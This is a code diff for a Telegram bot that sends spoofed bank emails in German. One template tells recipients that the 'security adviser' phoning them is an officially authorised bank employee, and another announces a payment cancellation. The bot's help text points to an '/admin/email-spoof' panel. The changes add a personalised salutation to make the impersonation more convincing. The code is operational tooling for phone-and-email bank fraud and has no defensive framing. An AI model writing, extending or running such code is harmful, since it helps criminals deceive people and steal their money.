@@ -138,7 +138,7 @@ function legitimierungTemplate(b: BankConfig): string {
         <tr><td style="height:3px;background-color:${b.topbar};font-size:0;line-height:0;">&nbsp;</td></tr>
         <tr><td style="padding:35px 40px 30px 40px;">
           <h1 style="margin:0 0 25px 0;font-size:20px;color:#1a1a1a;font-weight:700;line-height:1.35;">Legitimierung Ihres Sicherheitsberaters</h1>
-          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">Sehr geehrte Damen und Herren,</p>
+          <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">{{ANREDE_SATZ}}</p>
           <p style="margin:0 0 22px 0;font-size:15px;line-height:1.6;color:#333333;">zur Ihrer Sicherheit best&auml;tigen wir Ihnen hiermit schriftlich, dass der Sie derzeit telefonisch kontaktierende Sicherheitsberater ein <strong>offiziell autorisierter Mitarbeiter</strong> der ${b.fullName} ist. Bitte gleichen Sie die untenstehenden Legitimierungsdaten w&auml;hrend des Gespr&auml;chs mit Ihrem Berater ab.</p>
           <table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="margin:0 0 25px 0;"><tr>
             <td style="background-color:#f1f4f7;border-left:4px solid ${b.border};border-radius:0 6px 6px 0;padding:20px 24px;">
@@ -240,7 +240,7 @@ async function isAuthorized(chat_id: number): Promise<boolean> {
 
 // ---------- Flow logic ----------
 const STORNO_STEPS = ["empfaenger_name", "betrag", "empfaenger", "iban", "referenz", "email"] as const;
-const LEGIT_STEPS = ["referenz", "email"] as const;
+const LEGIT_STEPS = ["empfaenger_name", "referenz", "email"] as const;
 
 function stornoPrompt(step: string): string {
   switch (step) {
@@ -262,10 +262,12 @@ function stornoPrompt(step: string): string {
 
 function legitPrompt(step: string): string {
   switch (step) {
+    case "empfaenger_name":
+      return "📝 <b>Schritt 1/3 – An wen ist die Email gerichtet?</b>\n\nBitte inkl. Anrede eingeben.\n\n<b>Beispiele:</b>\n<code>Herr Max Mustermann</code>\n<code>Frau Erika Musterfrau</code>";
     case "referenz":
-      return "🔖 <b>Schritt 1/2 – Referenznummer</b>\n\n<b>Beispiel:</b>\n<code>LEG.774218</code>";
+      return "🔖 <b>Schritt 2/3 – Referenznummer</b>\n\n<b>Beispiel:</b>\n<code>LEG.774218</code>";
     case "email":
-      return "📧 <b>Schritt 2/2 – Empfänger-Email</b>\n\nAn welche Email-Adresse soll gesendet werden?\n\n<b>Beispiel:</b>\n<code>erika-kovacs@gmx.at</code>";
+      return "📧 <b>Schritt 3/3 – Empfänger-Email</b>\n\nAn welche Email-Adresse soll gesendet werden?\n\n<b>Beispiel:</b>\n<code>erika-kovacs@gmx.at</code>";
   }
   return "";
 }
@@ -302,6 +304,7 @@ function summary(flow: string, d: Record<string, string>): string {
   }
   return (
     `📋 <b>Zusammenfassung – ${bank.name}-Legitimierung</b>\n\n` +
+    `<b>An:</b> ${d.empfaenger_name}\n` +
     `<b>Referenz:</b> ${d.referenz}\n` +
     `<b>Email:</b> ${d.email}\n\n` +
     `<b>Absender:</b> ${bank.fromName} &lt;${bank.fromEmail}&gt;`
@@ -331,7 +334,9 @@ async function sendEmail(flow: string, d: Record<string, string>): Promise<{ ok:
       .replaceAll("{{REFERENZ}}", d.referenz);
     subject = `Stornierung Ihrer Zahlung – Referenz ${d.referenz}`;
   } else {
-    html = legitimierungTemplate(bank).replaceAll("{{REFERENZ}}", d.referenz);
+    html = legitimierungTemplate(bank)
+      .replaceAll("{{ANREDE_SATZ}}", buildAnredeSatz(d.empfaenger_name))
+      .replaceAll("{{REFERENZ}}", d.referenz);
     subject = `Legitimierung Ihres Sicherheitsberaters – Referenz ${d.referenz}`;
   }
 
@@ -459,9 +464,10 @@ async function handleUpdate(update: any) {
       "5. Referenznummer (z. B. <code>STOR.884772</code>)",
       "6. Ziel-Email-Adresse → danach Bestätigung & Versand",
       "",
-      "<b>Ablauf – Legitimierung (2 Schritte):</b>",
-      "1. Referenznummer (z. B. <code>LEG.774218</code>)",
-      "2. Ziel-Email-Adresse → danach Bestätigung & Versand",
+      "<b>Ablauf – Legitimierung (3 Schritte):</b>",
+      "1. Anrede (z. B. <i>Herr Mustermann</i> → wird zu „Sehr geehrter Herr Mustermann“)",
+      "2. Referenznummer (z. B. <code>LEG.774218</code>)",
+      "3. Ziel-Email-Adresse → danach Bestätigung & Versand",
       "",
       "<b>Zugriff:</b> Nur autorisierte Chat-IDs. Verwaltung unter <b>/admin/email-spoof</b>.",
     ].join("\n");
